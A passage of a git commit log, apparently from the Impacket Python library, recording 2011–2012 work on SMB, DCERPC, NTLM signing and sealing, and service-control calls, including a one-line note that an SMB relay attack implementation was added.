    Adding an option to recv to request 'count' amount of bytes. Especially important for TCP transports where we cannot know how many bytes we're receiving

commit 819096c7b0fe9cb7fd393d09509932dd9c42f8bd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 19 16:58:59 2012 +0000

    Second round for EnumServicesStatus().. it's now functional, but requires DCERPC reassembly

commit 811ff57d633b01b13c6d014f22d6eb3421c51da7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 18 20:34:26 2012 +0000

    Adding an option to transport.recv() to keep asking for packets.. needed if we need to reassembly fragmented RPC

commit 6a47304a3eb59ef2af247d11766d211f9f9bbe15
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 17 22:20:50 2012 +0000

    First round of EnumServicesStatus().. not yet functional.. gotta figure the packet out..

commit 9650b60e8ada4b4141092b22d79b8207f9120418
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 17 19:55:01 2012 +0000

    Fixed padding issue on WINREGOpenKey

commit 6df23f5f54abc2ae3b3494f2c9e6c32b381009ac
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 3 15:07:44 2012 +0000

    For backward compatibility, when no server_name or domain we will return '' instead of None

commit 9ea71ed53154e47466536b7747a479d927429963
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 22:56:16 2011 +0000

    If *SMBSERVER is sent as remote_name, we will try to get the remote NETBIOS name(via a getnodestatus) to help succeed the connection. If unsuccesful, we go with*SMBSERVER and hope for the best

commit 8e93819290d9d1d1d4b371dd30d0d84f948dbf5a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 22:55:02 2011 +0000

    timeout variable wrongly passed to the underlying NetBIOS layer

commit fd0285a615693077a2ae105bd8cf102cf1b9eb90
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 22:51:37 2011 +0000

    Fixed wrong padding calculation on a BindACK packet after the secondary address answer

commit 84656f1fad43c2e7107367f14cb6c33c3a2aef55
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 22:50:14 2011 +0000

    Removed since it has been replaced the old dcerpc.py

commit a46b751075de7737e99a39c9d9fe5b4c5ff6c580
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 20:04:24 2011 +0000

    Removing bogus test credentials :-|

commit 941269eeb02531ae6270846441bffd74d0f90426
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 20:03:24 2011 +0000

    Adjusted to work with latest dcerpc.py

commit 3840a4393ac93fa61ab2336913c1ce18f5b22f94
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 19:30:37 2011 +0000

    A basic implementation of the SMB Relay attack first published by cDc

commit fae2eaa80c2ff2c4cf66eaf7a06bd7bc595b10b4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 19:18:10 2011 +0000

    SMB Server example

commit a82203d1a25905ce736b0d80f5bc737454b0a493
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 18:29:13 2011 +0000

    A basic SMB Server implementation in Python

commit 22fbf53c239f3efc4ab74aa4ead09452ac2ae99b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 18:12:07 2011 +0000

    Using the new DCERPC.py library from now on.. supporting all flavors of NTLM (including fragmentation and encryption).
    This update BREAKS backward compatibility with the old dcerpc.py

commit 612a245c4bbb615bbad65663001b63fc332d5b23
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 18:09:55 2011 +0000

    Reverting previous commit and going back to revision r428.

commit 5a095bd87576872804a2288ab2e3f5912069f76a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 18:06:02 2011 +0000

    Reverting previous commit and going back to revision r428.

commit e4dc6ca3e090b681b6abc02579ea007ed700c680
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 26 17:56:50 2011 +0000

    an SMB Server implementation in python

commit 1982fc10440104ca78c15b92ca372a792a7a45d8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 23 21:31:41 2011 +0000

    Fixed alter_ctx handling. It wasn't honoring the right ctx when issuing the next bind call.

commit 1f9b1c0239ffd0fb1df18a070e4a44b515081066
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 22 21:15:17 2011 +0000

    Building an old MSRPCHeader() for backward compatibility

commit 27286086447143d0d24b2ec76ae79b4748d3b46e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 22 21:08:01 2011 +0000

    Leaving MSRPC_NOTAFRAG flag for backward compatibility

commit 7adefefcbceb6c53aa490d7f91743c37c8ec58e7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 22 12:18:06 2011 +0000

    RawCall class now belongs to this file

commit 5c8327672666d1e9136280fc9316fdc4f792f127
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 19 20:25:36 2011 +0000

    Improved get_server_name() and get_server_domain(). It now gets the info regardless of successful logon

commit 9e353a0eaf3b9577b3da08d38752bb6d71f97e86
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 15 22:16:30 2011 +0000

    Due to different dialects interpretation of MaxRawSize, we're limiting it to 0xffff

commit b073736474fb6fd7c0c1cb241e65a9b31f2ab99f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 15 19:23:19 2011 +0000

    Don't break login method if hashes are sent in binary form.

commit ced703fcac8daa349597d1054c127b4790bbe1e2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 14 20:00:36 2011 +0000

    fix in uuid import forcing it to use the impacket one.

commit 9e5c9ece19837a1fdee0af5571ba66dedcf00771
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 4 19:57:22 2011 +0000

    1) Fix a bug when bogus_binds was selected (lack of a tuple)
    2) Now the bogus_binds UUIDs are randomly generated

commit aa24cdc737717404f90eaac4ce67b7ef0e4f64ed
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 4 12:34:31 2011 +0000

    A better way to solve the Deprecation warning issue in structure.

commit a1c557fb97f81b4ab28d7c9a4e3fdfabfe2dda5e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 4 03:24:32 2011 +0000

    Fixes the 'DeprecationWarning: struct integer overflow masking is deprecated'
    error produced calling to id().
    More important now that python aborts when such error happens.

commit 2a47ee73bdc9af8ed4b3cb6bed9adfc01a50cc04
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 4 02:54:30 2011 +0000

    Fixed MSRPC packets __init__() when initializing structs with receiving data

commit d321dbb664b1fe576522b1ff387662327bb62c5e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 3 23:10:04 2011 +0000

    Added NetprNameCanonicalize() call

commit cce536b773f6a7136293f4a827507bc6003d2a83
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 3 22:46:30 2011 +0000

    Added NetrRemoteTOD() call

commit c39b6c4693fd5c56a4582de775a5406488f15b12
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 20 21:40:09 2011 +0000

    isValidAnswer should check if the error received is a NT one

commit 25f37aa73fc16921b8db4a36a681d6680eaaecd1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 20 21:34:15 2011 +0000

    Fixed list_path so it now:
    1) Reassemblies transactions
    2) If FIND_FIRST doesn't return all the data, call FIND_NEXT

commit 695e1404d51b68535fb9c2ba9d92f8509e94fa7a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Oct 5 20:12:53 2011 +0000

    dcerpc/dcerpc missing in the import sections, making some methods to fail

commit bdaa265cf5ee47022518d71420177e78f0bdd455
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 30 18:22:40 2011 +0000

    If ServerName not available when logging in, set it as Unavailable

commit 9a87a5be79348727b19056a29746bd073d151921
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 30 18:09:52 2011 +0000

    Storing server's information before sending the AUTH package

commit 075edfacf82f04a06f70265df0b25df6140ae70a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 30 17:59:27 2011 +0000

    If we created the SMB connection, we close it, otherwise that's up for the caller

commit 7058c2d9aa546d1896123659cdfeb7c39b166071
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Sep 28 23:18:52 2011 +0000

    Lowering connect timeouts to 10 seconds

commit 9f80410c2c3a35b51e1cabf6621d8cd4b04186d9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Sep 28 23:16:22 2011 +0000

    Replace debug stuff in signSMB with original code

commit 64f84b7b07dd35353f1e89517959a5dad47e5a3f
Author: pditincho@gmail.com <pditincho@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 8 21:15:21 2011 +0000

    Addition of support for scoped addresses. Addition of test case for scoped addresses.

commit 2371d945ade3d210553d3d76e27ab5ba0f2aaae1
Author: pditincho@gmail.com <pditincho@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 8 21:02:29 2011 +0000

    Bugfix - Constructor of IP6_Address now accepts a unicode string as a text representation, apart from just a regular string.

commit c6d0dccedae2911cf9bdc99ca48be859dc289d01
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 12 18:29:38 2011 +0000

    1. Added flags and packet types according to the standard
    2. InterfaceId is gonne, now we handle the uuids using uuid lib
    3. Added more rejection error codes
    4. Fix typo on SupportedVersions MSRPCBindNack struct
    5. Fix not checking reject reasons for bogus binds

commit ddf962fc7e0a5531388411aa9c5efc2374bb7e94
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 27 21:41:33 2011 +0000

    Remove the self._uid if the login was unsuccessful so we can try another login in the same existing connection

commit 13d082eabcd5221bd8140f28c78d64a178408512
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 27 00:49:32 2011 +0000

    Typo :)

commit ff25c78aa9823f38cd02346c713f99a44814e249
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 27 00:46:37 2011 +0000

    1. Fixups imports
    2. SVCCTLRespDeleteServiceHeader should be based on ImpactPacket.Header

commit e9968ab3e92c3c2e97e0200b02d4bd4591f53441
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 25 22:15:32 2011 +0000

    New dcerpc structures.
    1. All packets are Structures (no more ImpactPacket)
    2. Support SIGN/SEAL for all NTLM flavors
    3. Fixed bugs on fragmentation, now should work fine
    4. Fixed bugs on bogus_binds (doesn't throw error for the bogus binds)
    
    If you want to use this, overwrite the current dcerpc.py with this one.
    
    After further testing i'm replacing current dcerpc.py with this version.

commit 9ecb66eb02b43938886d643a2b3578b21f06befd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 25 19:57:38 2011 +0000

    Fixed the testcase with the new parameters to SEAL and SIGN

commit cad13332e6383535f464f1d8011e2958209239f7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 25 19:22:09 2011 +0000

    The special case for anonymous login was taken outside KXKEY.

commit a347c8992f898f3c59ac4d4df2f16d603e1bd582
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 25 19:11:29 2011 +0000

    1. Changed SEAL parameters, we need two instances of the packet, since encrypt and sign for NTLMv2 uses different information
    2. Special case in KXKEY when no password is set

commit 23f42eba04fbcf9ff80085662983cd1651974ede
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 25 02:42:08 2011 +0000

    Flags are maintained all over the session

commit 97a89e6ee430d1cb7e3fa28de716aa7e42a21281
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 23 19:26:10 2011 +0000

    Changes on the tests. The tests are actually giving OK results

commit 9cb0f1c55f11e750dcd202121ce90d1da3034acc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 23 19:25:32 2011 +0000

    More changes to SEAL/SIGN.. still not used and still not working (it only works on NTLMv1)

commit 00ba16dfcc3d142d387d644b4bd53c146895145b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 22 16:23:23 2011 +0000

    Check and report Bind errors except for the bogus ones

commit 5d91ed204df1814fe4a9217af1b871ebd5893ab7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 21 20:36:08 2011 +0000

    Small example to start/stop/delete remote services via svcctl

commit e5a2a308fdecdd3128d5c7012842e8acf5ad6409
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 21 20:29:46 2011 +0000

    Fixed typo in ACCESS_DENIED

commit c8b90a528dd363536dbf0cae22901a0c9cf64f64
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 19 19:30:07 2011 +0000

    OpenServiceA function added

commit 11a1db04bb96c9967f6559977c99161e073e3551
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 19 19:18:06 2011 +0000

    Changed 'w' for NDRString*W to make it easier to use. *W() functions expect unicode data

commit 65399eb5c22f9d575cf809a738bd91e674582778
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 19 19:16:58 2011 +0000

    NDRStringW and NDRUniqueStringW structures added

commit f9c0dc81b620f0444ba84ad155291e4c075c595e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 19 15:13:15 2011 +0000

    Removed checking for error in doRequest.. that's up for the client

commit 4d522e77e873212e3c836835a106c64fccdce744
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 19 14:05:00 2011 +0000

    SERVICE_INTERACTIVE_PROCESS flag added to CreateServiceW

commit 2bbc6ee6bd7d514b6bbbd6ec7bfb3905b0cbcdb5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 19 14:00:14 2011 +0000

    Added SVCCTL CloseServiceHandle(), OpenSCManagerW(), CreateServiceW(), StartServiceW(), OpenServiceW(), StopService() and DeleteService().
    Similar functionality was already in place, but now all with Structure (plus fixes some bugs).

commit 0bed17270e8963cecf7f53e7a2ec9fb542783c36
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 17 23:12:05 2011 +0000

    SHARED_DISK_HIDDEN type added

commit 89d4f53e287bebdd18d014a64059866fedd4be3f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 17 22:25:48 2011 +0000

    default port changed to 445
    increase timeout to 10 seconds

commit 5c96547e6fda093623ebf5a4e9d9b97d2a6f7df3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 17 17:39:56 2011 +0000

    Added isGuestSession() method.

commit ab8fb8a56dfe365e6ce49ed67c3273cb2cf6fa73
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 15 23:51:39 2011 +0000

    Added get_encryption_key() method

commit 8ef53d95f1bf71800e4a14183ad44bd7db13b054
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 15 18:42:58 2011 +0000

    Fixed NTLMAuthChallenge in the situation I sent TargetInfoFields not as a structure but just as pure data

commit ba643c0a4190e241284ad572a26a96758d9b29ca
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 13 21:17:30 2011 +0000

    TRANS2_SET_PATH_INFORMATION structure added

commit 2a7a537a1c4635a5e79e5031de356a5d06af9898
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 12 23:16:15 2011 +0000

    Fix in SessionSetup structure to be able to unpack it

commit 267633f25d61f4399973b3d1d7a318daeb6d29c6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 12 16:44:54 2011 +0000

    NetShareInfo structs added, for later use of list_shared()

commit 9ce99b85e62986e3c5609fa1d64219fb4e2edd3c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 12 13:38:24 2011 +0000

    Added Transaction_SData structure

commit 28658628b8fb55072a62897de48c0d20b901dc13
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 12 12:08:35 2011 +0000

    SMB_QUERY_FILE_EA_INFO structure added

commit 96f9507e6039ad20bc83f3785b85c01a2b00c509
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 12 00:44:34 2011 +0000

    Added SMB_SET_FILE_BASIC_INFO and SMB_SET_FILE_END_OF_FILE_INFO structures

commit 8647dd74c9cc328c6951fc39b6cdebf21562c0fe
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 9 21:54:07 2011 +0000

    Added TRANS2_FIND_NEXT2 and SMB_COM_TRANSACTION2_SECONDARY structs

commit 68093fcc22a51aedfa0c98f96b07d9aa2c44b788
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 9 00:04:22 2011 +0000

    Changed *Time fileds for CreateAndXParameters to 'q' size

commit 87b3471cca4c2cbcf0e08be743312eff6942844a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 7 17:37:04 2011 +0000

    TRANS2_SET_FILE_INFORMATION structures added.

commit 5e55c844cdd65caeb170f94cf858cfede19273f1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 7 15:36:29 2011 +0000

    SMB_COM_DELETE and SMB_COM_DELETE_DIRECTORY structures added

commit 39bd64942a2eaa424f7165bbfb084c55c7eefb50
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 7 13:26:51 2011 +0000

    Fix typo for smb.FILE_SUPERSEDE

commit 4ff68ca41698372a84a9b7f7dbca461494202c25
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 6 16:23:17 2011 +0000

    1. SMBWrite and SMBWriteAndX structures

commit 42aea7797cfa7bc8743842a7957c9b2e885e61f7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 5 22:28:01 2011 +0000

    1. More structures added, no functionality changed

commit 97e3bc463c2da534e5f09c0ab5ce56225f9db371
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 5 02:13:41 2011 +0000

    1. Added SMBReadAndX_Parameters2 structure

commit c1a18064572ddd85b6064f9dea89dd68d9f73670
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 5 00:55:54 2011 +0000

    1. Added structures for SMB_COM_QUERY_INFORMATION2 (0x23)

commit 988e3b5ec5f4b866bfbdbd0cce4ecece55ac70ea
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 4 20:55:37 2011 +0000

    1. Added constants and structures for various transaction functions

commit e29f3ada2a03872d87902023d1c2bd30d5ab37b0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 4 00:51:18 2011 +0000

    1. Added SMB_FILE_ATTRIBUTES
    2. Added QUERY_INFORMATION levels
    3. File System Attributes
    4. QUERY_FS Information Levels
    5. SMB_COM_QUERY_INFORMATION

commit 613b3c71c737a5eabcf1f3a65c6267c57fe0f08e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 3 20:20:48 2011 +0000

    Structures added:
    1. SMBTreeConnectAndXResponse_Parameters
    2. SMBTreeConnectAndXResponse_Data
    3. SMB_COM_TRANSACTION2
    4. SMB_COM_ECHO
    
    SMB_COM_LOGOFF flags

commit 4cc88d332266c57083de3229d2a08cd4e1cd8949
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 2 19:09:09 2011 +0000

    Comment for TREE_CONNECT_ANDX

commit 521d30f9805b9f4ad63a0b4e3d1517a78dba10e3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 2 18:55:53 2011 +0000

    Added support to parse SPNEGO structures if acting as a server

commit 9c46f8b4d515a4c649b3333bf3786a23fa2a4d43
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 2 18:55:20 2011 +0000

    1. Version and MIC now handled in NTLMChallengeResponse
    2. NTLMChallengeResponse.fromString() now work as expected

commit 65b58a498afa49613db2a917b1484d3bea0cdb13
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 2 00:00:56 2011 +0000

    NetBIOSTcpSession also accepts connections already established

commit b0a20ceea688f22996a0cd6dde20a4c3216cc1a2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 2 00:00:10 2011 +0000

    SPNEGO now decodes MechTokens if available

commit c42ef0d35b129550a6441d8fe65e00096780abff
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 1 23:59:02 2011 +0000

    AuthChallenge.getData() wasn't returning any data ;)

commit 9b57d86b7d9ad2e54ac79527fe8ac72ebcfefd69
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 30 21:49:46 2011 +0000

    isDCE instead of struct_type... more descriptive

commit 969a1d2c63364382e02f2cf370b9e2e657aba5f6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 29 15:19:16 2011 +0000

    get_server_name() now works for extended and non extended session security

commit fad6e704d83ac071ab70316df4e550329a3fd59e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 29 14:47:54 2011 +0000

    If port 445 and remote_name == '*SMBSERVER' -> remote_name = remote_host

commit 75402b57d8766e474807a78e791fb98a140c48aa
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 29 14:19:49 2011 +0000

    Updated the testcases based on previous commit changes

commit 3a595b57ba6cb288aee22402115852d3e17fcebc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 29 14:19:06 2011 +0000

    Changes to SEAL, MAC, and SIGN to adapt them to DCE Signing

commit 5899837dfe0d347ac1e0fc3e1b052a6350e54ee5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 27 19:31:24 2011 +0000

    Adjusting the data received based on previous commit. Now it does getData()

commit 382d4324d29026bb2cdf880b8755121a0ade29c6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 27 19:30:23 2011 +0000

    1. Added classes for DCERPC_NTLMMessageSignature
    2. Commented exportedSessionKey key weakening, that shouldn't be needed (I'm leaving that on until further testing)
    3. MAC() now received a parameter to construct the right structure if DCE is underway
    4. MAC() returns the structure instead of the data

commit 0c2880a76b4f911841b449a93ce4352a30e4f6cc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 25 02:28:13 2011 +0000

    Done.. all the sealing/signing tests are working now.. Time to put it working in real world

commit 7d4602c1800c5a0a48d089f52cd219daa7720d3d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 25 02:23:44 2011 +0000

    handle_seal should be used for message signing if also sealed. Yes.. confusing.. but that's what the documentation says..

commit 5d8bc3a42c3df577d88478a7237bd530ff3a14c1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 25 01:01:45 2011 +0000

    Since SEAL does SIGN as well, we should set the right keys and handlers for both situations

commit c76276300efa58eab916943b026c059723f9275b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 25 01:01:01 2011 +0000

    Still working

commit 2c350d6dfadf6f81571620a4cdd8edc5eefa09fc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 25 00:52:51 2011 +0000

    those damn magic constants must be asciiz

commit a79ab822c4441f05f6afef7faac8d72f58ac9471
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 25 00:51:23 2011 +0000

    Still working on this

commit 0efd5976665a79e63bbd71fdead0e7056bd07d14
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 24 23:23:49 2011 +0000

    keyExchangeKey should be available even if no KeyExchange is performed

commit 7685479e4479f2a47f858e07937e7bc7592f409b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 24 23:08:26 2011 +0000

    Adding the sealing/signing stuff tests. Not yet finished

commit 757093d2deac88388b13dde779de2fb80fb2c134
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 24 23:07:55 2011 +0000

    Added exportedSessionKey to KeyExchangeKey if no KEY_EXCH set. Double check this with tests

commit fbeb4b66b487f75ca33fca3b14c18d781a66b147
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
